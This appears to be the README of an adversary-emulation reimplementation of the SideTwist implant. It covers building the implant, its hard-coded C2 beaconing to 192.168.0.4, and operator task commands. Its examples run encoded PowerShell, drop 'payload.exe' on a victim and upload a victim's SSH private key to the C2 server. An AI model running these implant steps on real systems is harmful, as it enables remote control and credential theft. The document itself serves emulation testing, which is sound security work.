# SideTwist Implant

## About
The SideTwist implant consists of a single executable. In emulated execution, it only
executes a single command at a time, waiting to again be called by a scheduled task. In
the default execution, no arguments are required as the C2 address and port are hard-coded.
This implementation contains optional arguments to make testing with it a little easier.

At a high level, the lifecycle of the implant consists of the following actions:

```
1. Beacon to the C2 server to get a task in the format `<cmd index>|<cmd type>|<arg1[|arg2]>`
1a. Commands include: command execution, file download, file upload

2. Execute the requested task

3. Return the status via POST. There is a small deviation from the CTI here in that file downloads will generate a POST response
alerting the operator to a successful or unsuccessful write.
```

An additional file, `update.xml`, is required for execution. The implant checks the user's
%LOCALAPPDATA%\\SystemFailureReporter folder and terminates if not found. The file does not need 
to contain anything. This is a small deviation from the CTI which used a relative path. Upon testing 
with scheduled tasks from the command line, it appears that the binary was being run from a different 
path and subsequently unable to follow the relative link. Without using an XP-compatible version of 
schtasks from the command line, the "Start In" variable seemingly cannot be set in CMD to allow for the use
of relative paths.

## Build
The implant can be built in Visual Studio, with the Developer Command Prompt from VS, or
with msbuild.exe which can be obtained separately from VS. Whichever option is chosen,
ensure the file `update.xml` exists in %LOCALAPPDATA%\\SystemFailureReporter\\. For example,
for user gosta, place the `update.xml` file in `C:\Users\gosta\AppData\Local\SystemFailureReporter`. 
The file does not need to contain any data.

#### Developer Prompt
Open a developer command prompt and navigate to the directory containing the solution file
`SideTwist.sln` (it should be located in the same directory as the SideTwist and 
SideTwistTests code folders). Once there, run the following:

`devenv.exe SideTwist.sln /build Release`

The executable will be found in the release folder, typically located in `.\x64\Release`.

## Run
The program can be run without arguments to use the hard-coded values. These values are:

```
IP Address: 192.168.0.4
Port: 443
```

Without arguments, the implant will execute once and exit. To ease testing, additional
arguments are available in the `SideTwist-loopable.exe` version (or by swapping out the
main.cpp for the one found in SideTwist\\loopable_version). NOTE: This loopable version
simply checks the local relative path for update.xml and will not work with scheduled tasks.

```
--loop		Lets the agent continuously execute, looping every 10 seconds
-ip			Sets the IP address of the server rather than using the hard-coded address
-p			Sets the contact port of the server rather than using 443
```

### Note on Command Strings
When issuing a command execution instruction (101 or 104), the default executor is CMD.
Do not supply "cmd /c" as part of commands. For example, simply supply "whoami". Piping
commands is acceptable. Note: CMD does not handle single quotes for paths.

All commands automatically redirect STDERR to STDOUT to capture errors.

For PowerShell, it is recommended you use Base64 encoded commands. Be sure to use the
correct Base64 encoding (UTF-16LE). The command structure to the implant is as follows:

`powershell -e base64goeshere`

Do not include quotes, .exe, or cmd /c "powershell.exe ...".

If you have paths with spaces, recommend single quotes around the instruction with double
quotes inside:

`... 'dir "c:\program files"'`

### Example commands of each type
```
# Execute a command - can swap 101 for 104
./evalsC2client.py --set-task <ID> '101 whoami'
./evalsC2client.py --set-task <ID> '101 powershell -e JABlAG4AdgA6AGMAbwBtAHAAdQB0AGUAcgBuAGEAbQBlAA=='

# Download a file and save it to disk. Argument is victim\path\file.name|serverfile.name
./evalsC2client.py --set-task <ID> '102 c:\users\public\payload.exe|payload.exe'

# Upload a file
./evalsC2client.py --set-task <ID> '103 c:\users\dummy\.ssh\id_rsa'

# Kill the agent in loop mode
./evalsC2client.py --set-task <ID> '105'
```

## Tests
Once the solution is built, there's a separate test executable in the release folder
with the implant. Running that executable should produce the requisite test results.
Some tests depend on local environment variables. They have been written to encompass
the development range (e.g., the test will fail if run on anything other than dragon#).

The server connection is not currently mocked. This means a live C2 server is required for some
tests. Furthermore, the C2 server needs to be on the hard-coded C2 server (192.168.0.4).

The test for run() can be run with a live server and no instruction supplied (e.g. 
initial registration of the implant). 

The FileDownload test needs the implant to have already been registered and a specific 
task waiting: `... '102 c:\users\public\test.txt|sidetwist_test.txt'`. test.txt's contents
do not matter, only that it's a non-empty, base64 encoded file.
